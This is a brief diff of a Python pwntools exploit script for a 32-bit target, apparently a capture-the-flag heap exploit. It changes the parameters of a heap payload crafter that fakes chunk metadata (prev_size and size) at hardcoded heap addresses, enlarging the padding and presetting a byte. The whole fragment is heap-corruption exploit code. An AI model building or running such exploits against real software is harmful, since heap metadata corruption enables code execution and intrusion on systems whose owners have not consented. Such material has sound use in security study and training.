@@ -5,7 +5,7 @@ from pwn import *
 
 context.arch = "i386"
 
-hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=20, pre_length=20)
+hpc = HeapPayloadCrafter(0x0804b128, 0x804c008 + 8, post_length=32, pre_length=32, pre_preset={31:"a"})
 prev, metadata, post = hpc.generate_payload()
 PREV_SIZE_C, SIZE_C = metadata
 print "-=====================]"
